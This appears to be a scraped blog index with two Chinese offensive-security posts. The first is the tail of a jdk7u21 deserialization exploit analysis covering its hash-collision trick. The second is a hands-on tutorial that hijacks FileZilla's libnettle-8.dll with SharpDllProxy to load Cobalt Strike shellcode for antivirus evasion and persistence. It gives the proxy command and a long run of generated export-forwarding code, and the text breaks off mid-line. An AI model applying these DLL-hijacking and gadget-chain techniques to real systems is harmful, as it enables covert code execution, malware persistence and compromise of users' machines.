(IllegalAccessException var12) { throw new AssertionError(var12); } } if (!memberValueEquals(var7, var8)) { return false; } } return true; }} 执行成功 Hash绕过java.util.HashMap#put 条件e.hash == hash，也就是满足hash(templates)== hash(proxy) 调用了hash() java.util.HashMap#hash 进入hash()函数，这里调用了传入对象k的hashCode()方法，意味着有可能控制hash值，这里的k为创建的代理实例对象。接着调用了hashCode 因为使用了动态代理，调用hash(proxy)时会自动跳转到AnnotationInvocationHandler.invoke() sun.reflect.annotation.AnnotationInvocationHandler#invoke sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl 1234567891011121314151617private int hashCodeImpl() { int var1 = 0; Entry var3; //this.memberValues由构造函数传入的，可以控制，等于map Iterator var2 = this.memberValues.entrySet().iterator();//获取遍历器 for( ;var2.hasNext(); ) { var3 = (Entry)var2.next(); String key = var3.getKey();//（可控map的键） Object value = var3.getValue()；//（可控map的值） var1 += 127 * key.hashCode() ^ //可控map的键 的 hashCode memberValueHashCode(value); //可控map的值的 hashCode } return var1; } sun.reflect.annotation.AnnotationInvocationHandler#memberValueHashCode 12345private static int memberValueHashCode(Object var0) { Class var1 = var0.getClass(); if (!var1.isArray()) {//不是数组的话获取传入值的hashCode。 return var0.hashCode(); //返回var0这个对象的hashCode ... 实际执行 Proxy的hashCode = 127 * 可控键的hashCode ^ 可控值的hashCode == TemplatesImpl的hashCode 只要让可控键的hashCode为0即可，利用f5a5a608的hashcode为0，字符串的hashcode也为0，在POC中构造map.put(&quot;f5a5a608&quot;, templates), 这样 12var1 = 127 * 0 ^ templates的hashCodevar1 = templates的hashCode map.putjava.util.HashSet#add payload中把map.put(&quot;f5a5a608&quot;, templates)放在最后，这是因为add方法中调用了map.put，如果放在前面就会满足条件直接在本地触发命令执行，经过序列化之后的数据不能反序列化成功。","link":"/2021/04/24/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"DLL代理加载shellcode实践","text":"在程序开发过程中往往会使用第三方库，大多数第三方库会提供DLL(动态链接库)文件，因此程序需要相应的DLL文件才能启动，通过Dll代理将正常dll替换为欸一dll，可以进行免杀或权限维持 找出运行必须的dll文件依照DLL代理加载shellcod用于免杀，维权等等中的例子下载Filezilla，将fzsftp.exe放到单独文件夹运行，找到运行必须的libnettle-8.dll文件 编译SharpDllProxy下载SharpDllProxy后用Visual Stuio 2019打开SharpDllProxy.sln 编译生成SharpDllProxy.exe 生成代理Dll指定目标dll文件后生成libnettle-8_pragma.c和tmp2BF5.dll，payload.bin为cs生成的raw格式shellcode。 1sharpdllproxy.exe --dll E:\\dllproxy\\libnettle-8.dll --payload E:\\dllproxy\\payload.bin 在vs中新建动态链接库将生成的libnettle-8_pragma.c代码复制后编译生成可执行shellcode的同名dll文件用以顶替原有的libnettle-8.dll文件 成功执行shellcode需要4个文件,fzsftp.exe调用替换后的恶意libnettle-8.dll文件后从payload.bin中读取shellcode后执行，tmp2BF5.dll即原来正常的libnettle-8.dll文件，保证程序正常运行 执行后cs成功上线 原理分析用vs打开libnettle-8_pragma.c后查看代码，开头调用了400多个tmp2BF5.dll中的函数以保证文件的正常运行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546#include &quot;pch.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define _CRT_SECURE_NO_DEPRECATE#pragma warning (disable : 4996)#pragma comment(linker, &quot;/export:_nettle_aeads=tmp2BF5._nettle_aeads,@1&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt=tmp2BF5._nettle_aes_decrypt,@2&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt_aesni=tmp2BF5._nettle_aes_decrypt_aesni,@3&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt_x86_64=tmp2BF5._nettle_aes_decrypt_x86_64,@4&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt=tmp2BF5._nettle_aes_encrypt,@5&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_aesni=tmp2BF5._nettle_aes_encrypt_aesni,@6&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_table=tmp2BF5._nettle_aes_encrypt_table,@7&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_x86_64=tmp2BF5._nettle_aes_encrypt_x86_64,@8&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_invert=tmp2BF5._nettle_aes_invert,@9&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_set_key=tmp2BF5._nettle_aes_set_key,@10&quot;)#pragma comment(linker, &quot;/export:_nettle_armors=tmp2BF5._nettle_armors,@11&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_absorb=tmp2BF5._nettle_camellia_absorb,@12&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_crypt=tmp2BF5._nettle_camellia_crypt,@13&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_invert_key=tmp2BF5._nettle_camellia_invert_key,@14&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_table=tmp2BF5._nettle_camellia_table,@15&quot;)#pragma comment(linker, &quot;/export:_nettle_chacha_core=tmp2BF5._nettle_chacha_core,@16&quot;)#pragma comment(linker, &quot;/export:_nettle_ciphers=tmp2BF5._nettle_ciphers,@17&quot;)#pragma comment(linker, &quot;/export:_nettle_cpuid=tmp2BF5._nettle_cpuid,@18&quot;)#pragma comment(linker, &quot;/export:_nettle_ctr_crypt16=tmp2BF5._nettle_ctr_crypt16,@19&quot;)#pragma comment(linker, &quot;/export:_nettle_gcm_hash8=tmp2BF5._nettle_gcm_hash8,@20&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_encrypt_block=tmp2BF5._nettle_gost28147_encrypt_block,@21&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_param_CryptoPro_3411=tmp2BF5._nettle_gost28147_param_CryptoPro_3411,@22&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_param_test_3411=tmp2BF5._nettle_gost28147_param_test_3411,@23&quot;)#pragma comment(linker, &quot;/export:_nettle_hashes=tmp2BF5._nettle_hashes,@24&quot;)#pragma comment(linker, &quot;/export:_nettle_macs=tmp2BF5._nettle_macs,@25&quot;)#pragma comment(linker, &quot;/export:_nettle_memxor_sse2=tmp2BF5._nettle_memxor_sse2,@26&quot;)#pragma comment(linker, &quot;/export:_nettle_memxor_x86_64=tmp2BF5._nettle_memxor_x86_64,@27&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_block=tmp2BF5._nettle_poly1305_block,@28&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_digest=tmp2BF5._nettle_poly1305_digest,@29&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_set_key=tmp2BF5._nettle_poly1305_set_key,@30&quot;)#pragma comment(linker, &quot;/export:_nettle_ripemd160_compress=tmp2BF5._nettle_ripemd160_compress,@31&quot;)#pragma comment(linker, &quot;/export:_nettle_salsa20_core=tmp2BF5._nettle_salsa20_core,@32&quot;)#pragma comment(linker, &quot;/export:_nettle_sha1_compress_sha_ni=tmp2BF5._nettle_sha1_compress_sha_ni,@33&quot;)#pragma comment(linker, &quot;/export:_nettle_sha1_compress_x86_64=tmp2BF5._nettle_sha1_compress_x86_64,@34&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress=tmp2BF5._nettle_sha256_compress,@35&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress_sha_ni=tmp2BF5._nettle_sha256_compress_sha_ni,@36&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress_x86_64=tmp2BF5._nettle_sha256_compress_x86_64,@37&quot;)#pragma comment(linker, &quot;/export:_nettle_sha3_pad=tmp2BF5._nettle_sha3_pad,@38&quot;)#pragma comment(linker, &quot;/export:_nettle_sha3_update=tmp2BF5._nettle_sha3_update,@39&quot;)#pragma comment(linker, &quot;/export:_nettle_sha512_compress=tmp2BF5._nettle_sha512_compress,@40&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2=tmp2BF5._nettle_umac_l2,@41&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2_final=tmp2BF5._nettle_umac_l2_final,@42&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2_init=tmp2BF5._nettle_umac_l2_init,@43&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l3=tmp2BF5._nettle_umac_l3,@44&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l3_init=tmp2BF5._nettle_umac_l3_init,@45&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_nh=tmp2BF5._nettle_umac_nh,@46&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_nh_n=tmp2BF5._nettle_umac_nh_n,@47&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_poly128=tmp2BF5._nettle_umac_poly128,@48&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_poly64=tmp2BF5._nettle_umac_poly64,@49&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_set_key=tmp2BF5._nettle_umac_set_key,@50&quot;)#pragma comment(linker, &quot;/export:_nettle_write_be32=tmp2BF5._nettle_write_be32,@51&quot;)#pragma comment(linker, &quot;/export:_nettle_write_le32=tmp2BF5._nettle_write_le32,@52&quot;)#pragma comment(linker, &quot;/export:_nettle_write_le64=tmp2BF5._nettle_write_le64,@53&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Final=tmp2BF5.nettle_MD5Final,@54&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Init=tmp2BF5.nettle_MD5Init,@55&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Update=tmp2BF5.nettle_MD5Update,@56&quot;)#pragma comment(linker, &quot;/export:nettle_aes128=tmp2BF5.nettle_aes128,@57&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_decrypt=tmp2BF5.nettle_aes128_decrypt,@58&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_encrypt=tmp2BF5.nettle_aes128_encrypt,@59&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_invert_key=tmp2BF5.nettle_aes128_invert_key,@60&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_set_decrypt_key=tmp2BF5.nettle_aes128_set_decrypt_key,@61&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_set_encrypt_key=tmp2BF5.nettle_aes128_set_encrypt_key,@62&quot;)#pragma comment(linker, &quot;/export:nettle_aes192=tmp2BF5.nettle_aes192,@63&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_decrypt=tmp2BF5.nettle_aes192_decrypt,@64&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_encrypt=tmp2BF5.nettle_aes192_encrypt,@65&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_invert_key=tmp2BF5.nettle_aes192_invert_key,@66&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_set_decrypt_key=tmp2BF5.nettle_aes192_set_decrypt_key,@67&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_set_encrypt_key=tmp2BF5.nettle_aes192_set_encrypt_key,@68&quot;)#pragma comment(linker, &quot;/export:nettle_aes256=tmp2BF5.nettle_aes256,@69&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_decrypt=tmp2BF5.nettle_aes256_decrypt,@70&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_encrypt=tmp2BF5.nettle_aes256_encrypt,@71&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_invert_key=tmp2BF5.nettle_aes256_invert_key,@72&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_set_decrypt_key=tmp2BF5.nettle_aes256_set_decrypt_key,@73&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_set_encrypt_key=tmp2BF5.nettle_aes256_set_encrypt_key,@74&quot;)#pragma comment(linker, &quot;/export:nettle_aes_decrypt=tmp2BF5.nettle_aes_decrypt,@75&quot;)#pragma comment(linker, &quot;/export:nettle_aes_encrypt=tmp2BF5.nettle_aes_encrypt,@76&quot;)#pragma comment(linker, &quot;/export:nettle_aes_invert_key=tmp2BF5.nettle_aes_invert_key,@77&quot;)#pragma comment(linker, &quot;/export:nettle_aes_set_decrypt_key=tmp2BF5.nettle_aes_set_decrypt_key,@78&quot;)#pragma comment(linker, &quot;/export:nettle_aes_set_encrypt_key=tmp2BF5.nettle_aes_set_encrypt_key,@79&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour128_set_key=tmp2BF5.nettle_arcfour128_set_key,@80&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour_crypt=tmp2BF5.nettle_arcfour_crypt,@81&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour_set_key=tmp2BF5.nettle_arcfour_set_key,@82&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128=tmp2BF5.nettle_arctwo128,@83&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128_set_key=tmp2BF5.nettle_arctwo128_set_key,@84&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128_set_key_gutmann=tmp2BF5.nettle_arctwo128_set_key_gutmann,@85&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo40=tmp2BF5.nettle_arctwo40,@86&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo40_set_key=tmp2BF5.nettle_arctwo40_set_key,@87&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo64=tmp2BF5.nettle_arctwo64,@88&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo64_set_key=tmp2BF5.nettle_arctwo64_set_key,@89&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_decrypt=tmp2BF5.nettle_arctwo_decrypt,@90&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_encrypt=tmp2BF5.nettle_arctwo_encrypt,@91&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_gutmann128=tmp2BF5.nettle_arctwo_gutmann128,@92&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key=tmp2BF5.nettle_arctwo_set_key,@93&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key_ekb=tmp2BF5.nettle_arctwo_set_key_ekb,@94&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key_gutmann=tmp2BF5.nettle_arctwo_set_key_gutmann,@95&quot;)#pragma comment(linker, &quot;/export:nettle_base16=tmp2BF5.nettle_base16,@96&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_final=tmp2BF5.nettle_base16_decode_final,@97&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_init=tmp2BF5.nettle_base16_decode_init,@98&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_single=tmp2BF5.nettle_base16_decode_single,@99&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_update=tmp2BF5.nettle_base16_decode_update,@100&quot;)#pragma comment(linker, &quot;/export:nettle_base16_encode_single=tmp2BF5.nettle_base16_encode_single,@101&quot;)#pragma comment(linker, &quot;/export:nettle_base16_encode_update=tmp2BF5.nettle_base16_encode_update,@102&quot;)#pragma comment(linker, &quot;/export:nettle_base64=tmp2BF5.nettle_base64,@103&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_final=tmp2BF5.nettle_base64_decode_final,@104&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_init=tmp2BF5.nettle_base64_decode_init,@105&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_single=tmp2BF5.nettle_base64_decode_single,@106&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_update=tmp2BF5.nettle_base64_decode_update,@107&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_final=tmp2BF5.nettle_base64_encode_final,@108&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_group=tmp2BF5.nettle_base64_encode_group,@109&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_init=tmp2BF5.nettle_base64_encode_init,@110&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_raw=tmp2BF5.nettle_base64_encode_raw,@111&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_single=tmp2BF5.nettle_base64_encode_single,@112&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_update=tmp2BF5.nettle_base64_encode_update,@113&quot;)#pragma comment(linker, &quot;/export:nettle_base64url=tmp2BF5.nettle_base64url,@114&quot;)#pragma comment(linker, &quot;/export:nettle_base64url_decode_init=tmp2BF5.nettle_base64url_decode_init,@115&quot;)#pragma comment(linker, &quot;/export:nettle_base64url_encode_init=tmp2BF5.nettle_base64url_encode_init,@116&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish128_set_key=tmp2BF5.nettle_blowfish128_set_key,@117&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_decrypt=tmp2BF5.nettle_blowfish_decrypt,@118&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_encrypt=tmp2BF5.nettle_blowfish_encrypt,@119&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_set_key=tmp2BF5.nettle_blowfish_set_key,@120&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_clear=tmp2BF5.nettle_buffer_clear,@121&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_copy=tmp2BF5.nettle_buffer_copy,@122&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_grow=tmp2BF5.nettle_buffer_grow,@123&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init=tmp2BF5.nettle_buffer_init,@124&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init_realloc=tmp2BF5.nettle_buffer_init_realloc,@125&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init_size=tmp2BF5.nettle_buffer_init_size,@126&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_reset=tmp2BF5.nettle_buffer_reset,@127&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_space=tmp2BF5.nettle_buffer_space,@128&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_write=tmp2BF5.nettle_buffer_write,@129&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128=tmp2BF5.nettle_camellia128,@130&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_crypt=tmp2BF5.nettle_camellia128_crypt,@131&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_invert_key=tmp2BF5.nettle_camellia128_invert_key,@132&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_set_encrypt_key=tmp2BF5.nettle_camellia128_set_encrypt_key,@133&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192=tmp2BF5.nettle_camellia192,@134&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192_set_decrypt_key=tmp2BF5.nettle_camellia192_set_decrypt_key,@135&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192_set_encrypt_key=tmp2BF5.nettle_camellia192_set_encrypt_key,@136&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256=tmp2BF5.nettle_camellia256,@137&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_crypt=tmp2BF5.nettle_camellia256_crypt,@138&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_invert_key=tmp2BF5.nettle_camellia256_invert_key,@139&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_set_decrypt_key=tmp2BF5.nettle_camellia256_set_decrypt_key,@140&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_set_encrypt_key=tmp2BF5.nettle_camellia256_set_encrypt_key,@141&quot;)#pragma comment(linker, &quot;/export:nettle_camellia_set_decrypt_key=tmp2BF5.nettle_camellia_set_decrypt_key,@142&quot;)#pragma comment(linker, &quot;/export:nettle_cast128=tmp2BF5.nettle_cast128,@143&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_decrypt=tmp2BF5.nettle_cast128_decrypt,@144&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_encrypt=tmp2BF5.nettle_cast128_encrypt,@145&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_set_key=tmp2BF5.nettle_cast128_set_key,@146&quot;)#pragma comment(linker, &quot;/export:nettle_cast5_set_key=tmp2BF5.nettle_cast5_set_key,@147&quot;)#pragma comment(linker, &quot;/export:nettle_cbc_decrypt=tmp2BF5.nettle_cbc_decrypt,@148&quot;)#pragma comment(linker, &quot;/export:nettle_cbc_encrypt=tmp2BF5.nettle_cbc_encrypt,@149&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_decrypt=tmp2BF5.nettle_ccm_aes128_decrypt,@150&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_decrypt_message=tmp2BF5.nettle_ccm_aes128_decrypt_message,@151&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_digest=tmp2BF5.nettle_ccm_aes128_digest,@152&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_encrypt=tmp2BF5.nettle_ccm_aes128_encrypt,@153&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_encrypt_message=tmp2BF5.nettle_ccm_aes128_encrypt_message,@154&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_set_key=tmp2BF5.nettle_ccm_aes128_set_key,@155&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_set_nonce=tmp2BF5.nettle_ccm_aes128_set_nonce,@156&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_update=tmp2BF5.nettle_ccm_aes128_update,@157&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_decrypt=tmp2BF5.nettle_ccm_aes192_decrypt,@158&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_decrypt_message=tmp2BF5.nettle_ccm_aes192_decrypt_message,@159&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_digest=tmp2BF5.nettle_ccm_aes192_digest,@160&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_encrypt=tmp2BF5.nettle_ccm_aes192_encrypt,@161&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_encrypt_message=tmp2BF5.nettle_ccm_aes192_encrypt_message,@162&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_set_key=tmp2BF5.nettle_ccm_aes192_set_key,@163&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_set_nonce=tmp2BF5.nettle_ccm_aes192_set_nonce,@164&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_update=tmp2BF5.nettle_ccm_aes192_update,@165&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_decrypt=tmp2BF5.nettle_ccm_aes256_decrypt,@166&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_decrypt_message=tmp2BF5.nettle_ccm_aes256_decrypt_message,@167&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_digest=tmp2BF5.nettle_ccm_aes256_digest,@168&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_encrypt=tmp2BF5.nettle_ccm_aes256_encrypt,@169&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_encrypt_message=tmp2BF5.nettle_ccm_aes256_encrypt_message,@170&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_set_key=tmp2BF5.nettle_ccm_aes256_set_key,@171&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_set_nonce=tmp2BF5.nettle_ccm_aes256_set_nonce,@172&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_update=tmp2BF5.nettle_ccm_aes256_update,@173&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_decrypt=tmp2BF5.nettle_ccm_decrypt,@174&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_decrypt_message=tmp2BF5.nettle_ccm_decrypt_message,@175&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_digest=tmp2BF5.nettle_ccm_digest,@176&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_encrypt=tmp2BF5.nettle_ccm_encrypt,@177&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_encrypt_message=tmp2BF5.nettle_ccm_encrypt_message,@178&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_set_nonce=tmp2BF5.nettle_ccm_set_nonce,@179&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_update=tmp2BF5.nettle_ccm_update,@180&quot;)#pragma comment(linker, &quot;/export:nettle_cfb8_decrypt=tmp2BF5.nettle_cfb8_decrypt,@181&quot;)#pragma comment(linker, &quot;/export:nettle_cfb8_encrypt=tmp2BF5.nettle_cfb8_encrypt,@182&quot;)#pragma comment(linker, &quot;/export:nettle_cfb_decrypt=tmp2BF5.nettle_cfb_decrypt,@183&quot;)#pragma comment(linker, &quot;/export:nettle_cfb_encrypt=tmp2BF5.nettle_cfb_encrypt,@184&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_crypt=tmp2BF5.nettle_chacha_crypt,@185&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_crypt32=tmp2BF5.nettle_chacha_crypt32,@186&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305=tmp2BF5.nettle_chacha_poly1305,@187&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_decrypt=tmp2BF5.nettle_chacha_poly1305_decrypt,@188&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_digest=tmp2BF5.nettle_chacha_poly1305_digest,@189&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_encrypt=tmp2BF5.nettle_chacha_poly1305_encrypt,@190&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_set_key=tmp2BF5.nettle_chacha_poly1305_set_key,@191&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_set_nonce=tmp2BF5.nettle_chacha_poly1305_set_nonce,@192&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_update=tmp2BF5.nettle_chacha_poly1305_update,@193&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_counter=tmp2BF5.nettle_chacha_set_counter,@194&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_counter32=tmp2BF5.nettle_chacha_set_counter32,@195&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_key=tmp2BF5.nettle_chacha_set_key,@196&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_nonce=tmp2BF5.nettle_chacha_set_nonce,@197&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_nonce96=tmp2BF5.nettle_chacha_set_nonce96,@198&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_digest=tmp2BF5.nettle_cmac128_digest,@199&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_init=tmp2BF5.nettle_cmac128_init,@200&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_set_key=tmp2BF5.nettle_cmac128_set_key,@201&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_update=tmp2BF5.nettle_cmac128_update,@202&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_digest=tmp2BF5.nettle_cmac64_digest,@203&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_init=tmp2BF5.nettle_cmac64_init,@204&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_set_key=tmp2BF5.nettle_cmac64_set_key,@205&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_update=tmp2BF5.nettle_cmac64_update,@206&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128=tmp2BF5.nettle_cmac_aes128,@207&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_digest=tmp2BF5.nettle_cmac_aes128_digest,@208&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_set_key=tmp2BF5.nettle_cmac_aes128_set_key,@209&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_update=tmp2BF5.nettle_cmac_aes128_update,@210&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256=tmp2BF5.nettle_cmac_aes256,@211&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_digest=tmp2BF5.nettle_cmac_aes256_digest,@212&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_set_key=tmp2BF5.nettle_cmac_aes256_set_key,@213&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_update=tmp2BF5.nettle_cmac_aes256_update,@214&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3=tmp2BF5.nettle_cmac_des3,@215&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_digest=tmp2BF5.nettle_cmac_des3_digest,@216&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_set_key=tmp2BF5.nettle_cmac_des3_set_key,@217&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_update=tmp2BF5.nettle_cmac_des3_update,@218&quot;)#pragma comment(linker, 